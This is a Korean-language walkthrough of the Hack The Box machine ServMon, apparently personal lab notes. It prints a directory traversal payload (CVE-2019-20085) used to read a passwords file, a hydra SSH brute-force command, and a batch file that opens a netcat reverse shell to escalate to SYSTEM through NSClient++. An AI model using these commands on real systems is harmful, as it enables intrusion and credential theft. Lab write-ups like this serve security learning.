# HTB-SERVMON
```bash
OS: Windows
DATE: 26.09.02
DIFFICULTY: Easy
```

## RECON
**nmap**: 전체 포트 검사를 먼저 진행한 후, 열린 포트를 대상으로 상세 포트를 조사했다.
```bash
nmap -p- -T4 IP
nmap -sC -sV -p PORTS IP
```
검사 결과 21(FTP), 22(SSH), 80(HTTP), 445(SMB), 8443(HTTPS) 등 많은 포트가 나왔다. 가장 눈여겨본 포트는 21번 FTP였다. FTP anonymous 로그인이 가능해서 가장 먼저 접근을 시도했다.

## Initial Access
```bash
ftp IP
anonymous
```
anonymous 유저로 접속한 결과, Users 폴더에 nathan과 nadine이라는 유저 폴더가 있었다. nathan 유저의 폴더에는 'Notes to do.txt'라는 파일이 있었고, nadine 유저의 폴더에는 Confidential.txt 파일이 있었다.
- **Confidential.txt**: 
```txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine  
```
- **Notes to do.txt**:
```txt
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
라는 메시지들이 있었다. 이로써 Nathan 유저의 Desktop에 Passwords.txt 파일이 있다는 것을 알게 된 후, HTTP 서비스에 접근했다. 처음 접근했을 때 로그인 창과 함께 NVMS-1000이라는 프로그램이 떴다. 이후 NVMS-1000 exploit을 검색한 결과, CVE-2019-20085 취약점을 가지고 있다는 것을 확인할 수 있었다.
- **CVE-2019-20085**: Directory Traversal 취약점이 있어 IP/../../../../../../../windows/win.ini 을 요청하면 대상 파일을 읽을 수 있는 취약점이었다.

이 취약점을 알게 된 후 바로 브라우저에서 실행해봤지만, 브라우저는 ../../../../ 페이로드를 스킵하는 기능이 있어 명령어를 통해 대상 파일을 읽을 수 있었다.
```bash
curl http://IP/../../../../../../../windows/win.ini --path-as-is
```
LFI가 가능하다는 것을 알게 된 후, 아까 얻었던 단서인 nadine의 Desktop에 있는 Passwords.txt를 추출할 수 있었다.
```bash
curl http://IP/../../../../../../../Users/nadine/Desktop/Passwords.txt --path-as-is
```
Passwords 파일에는 5개의 패스워드 리스트가 있었다. 그래서 nadine 유저로 SSH bruteforce를 실시한 결과, nadine 유저의 SSH 비밀번호를 얻고 접속할 수 있었다.
```bash
hydra -l nadine -P pass.txt ssh://IP
```
```bash
ssh nadine@IP
```
이로써 nadine 유저로 초기 접근에 성공할 수 있었다.
![user](attach_real/Pasted%20image%2020260902191252.png)

## Privilege Escalation
Nadine 유저의 쉘을 얻고 많은 것을 시도해봤지만 모든 게 실패했다. 하지만 열거 도중 'c:\Program Files\' 디렉토리에 NSClient++라는 프로그램이 있어 계속해서 확인해본 결과, nsclient.ini 파일에 password가 있다는 것을 확인할 수 있었다. 대상 시스템은 로컬 8443 포트에서 실행 중인 것을 알게 되었고, SSH 로컬 포트포워딩을 실시했다.
```bash
ssh -L 8443:127.0.0.1:8443 nadine@IP
```
포트포워딩 후 브라우저로 `localhost:8443`에 접속했다. 대상은 NSClient++라는 프로그램이 실행 중이었고, 아까 얻은 비밀번호로 로그인에 성공할 수 있었다. 대상 시스템 exploit을 하기 위해 버전을 찾아본 결과, "C:\Program Files\NSClient++\nscp.exe" --version 을 통해 0.5.2.35 버전이라는 것을 알게 되었다. exploit을 찾아본 결과, 리버스쉘을 통해 권한 상승이 가능하다는 것을 알게 되었다.
- **원리**: NSClient++는 SYSTEM 권한으로 돌아가는 서비스 -> 이 서비스한테 "이 스크립트 실행해줘"라고 시킬 수 있으면 그 결과물도 SYSTEM 권한으로 실행된다.

따라서 EDB에 나온 것처럼 evil.bat 파일을 먼저 만들었다.
```bat
@echo off
c:\temp\nc.exe tun0_IP 443 -e cmd.exe
```
이후 브라우저 UI에 들어가서 스크립트를 등록해주었다.
Settings > external scripts > scripts > Add New 에서 **foobar**라는 이름으로 **command = c:\temp\evil.bat** 을 지정해 evil.bat 파일을 인식시켰다.

다음으로 스케줄러에 등록하여 1분마다 evil.bat 파일을 실행되게 했다. Settings > scheduler > schedules > Add New 에서 **command = foobar, interval = 1m** 으로 설정하고 change 버튼을 누른 후 Save 했다. 내 컴퓨터에서 리스닝을 켠 후 재부팅을 통해 SYSTEM 쉘을 얻을 수 있었다.
![system](attach_real/Pasted%20image%2020260902191105.png)

## New Infor
- 항상 힌트를 잘 생각하자.
- 쉘을 얻은 후 꼭 프로그램 파일까지 확인해서 대상 시스템에 어떤 것이 있고 어떤 것이 돌아가는지 확인한다.
- 권한 상승이 프로그램을 통해서도 가능하다.